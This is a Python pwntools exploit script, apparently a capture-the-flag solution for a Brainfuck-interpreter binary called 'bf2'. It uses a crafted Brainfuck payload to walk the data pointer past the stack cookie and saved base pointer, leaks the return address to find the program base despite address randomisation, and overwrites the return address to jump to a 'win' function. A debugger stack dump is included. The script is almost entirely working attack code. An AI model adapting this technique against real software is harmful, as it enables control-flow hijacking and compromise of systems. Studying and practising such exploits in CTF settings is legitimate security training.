#!/usr/bin/env python3

from pwn import *
context(arch='amd64', os='linux')

elf = ELF('container/bf2')
r = elf.process()

LEAK_OFFSET = 0x00000000000015FC

"""
0x00007ffcdc453000│+0x0000: 0x0000000000000003	 ← $rsp
0x00007ffcdc453008│+0x0008: 0x00007ffcdc453460  →  0x0000000a272e2762 ("b'.'\n"?)
0x00007ffcdc453010│+0x0010: 0x0000000000000000
0x00007ffcdc453018│+0x0018: 0x00007ffcdc453030  →  0x0000000000000000
0x00007ffcdc453020│+0x0020: 0x0000000000000000
0x00007ffcdc453028│+0x0028: 0x00000000677f9a5f
0x00007ffcdc453030│+0x0030: 0x0000000000000000
...
0x00007ffcdc453428│+0x0428: 0x0000000000000000
0x00007ffcdc453430│+0x0430: 0x00007ffcdc4534b0  →  0x0000000000000000	 ← $rdi
0x00007ffcdc453438│+0x0438: 0x3172b48997b61100
0x00007ffcdc453440│+0x0440: 0x00007ffcdc4534b0  →  0x0000000000000000	 ← $rbp
0x00007ffcdc453448│+0x0448: 0x00005609c82cd5fc  →  <main+249> jmp 0x5609c82cd622 <main+287>
0x00007ffcdc453450│+0x0450: 0x00005609c82cc040  →  0x0000000400000006
0x00007ffcdc453458│+0x0458: 0x0000000100f0b6ff
0x00007ffcdc453460│+0x0460: 0x0000000a272e2762 ("b'.'\n"?)	 ← $rdx, $r8
0x00007ffcdc453468│+0x0468: 0x00007ffcdc453497  →  0x005609c82cd1a000
0x00007ffcdc453470│+0x0470: 0x00007ffcdc453496  →  0x5609c82cd1a00000
0x00007ffcdc453478│+0x0478: 0x00005609c82cd67d  →  <__libc_csu_init+77> add rbx, 0x1
0x00007ffcdc453480│+0x0480: 0x00007f3065d10fc8  →  0x0000000000000000

"""

# 0x00007ffcdc453448 - 0x00007ffcdc453030 = 1048

r.recvuntil('> ')
r.sendline(str(1))

# Setup pointer increment code
payload = b''
payload += b'[>,]'        # increment pointer while input is not 0
payload += b'>'*(8+8+1)   # increment past stack cookie and base ptr
payload += b'.>'*6        # leak return pointer
payload += b'<,'*6        # overwrite return pointer
assert len(payload) <= 64 # make sure payload is short enough
log.info('Payload len: %d', len(payload))
log.info('Payload: %s', payload.decode('ascii'))
pause()
r.sendline(str(payload))

# Increment pointer
payload2 = b''
payload2 += b'\1'*(1048-(8+8+1)-1)
payload2 += b'\0'
r.send(payload2)

# Leak return address
leak_addr = u64(r.recvn(6).ljust(8, b'\0'))
log.info('Leak address: %#10x', leak_addr)

# Calculate win address
elf.address = leak_addr - LEAK_OFFSET
log.info('Base address: %#10x', elf.address)
log.info('Win address: %#10x', elf.symbols['win'])

# Overwrite return address
win_bytes = p64(elf.symbols['win'])[:-2][::-1]
r.send(win_bytes)

r.interactive()
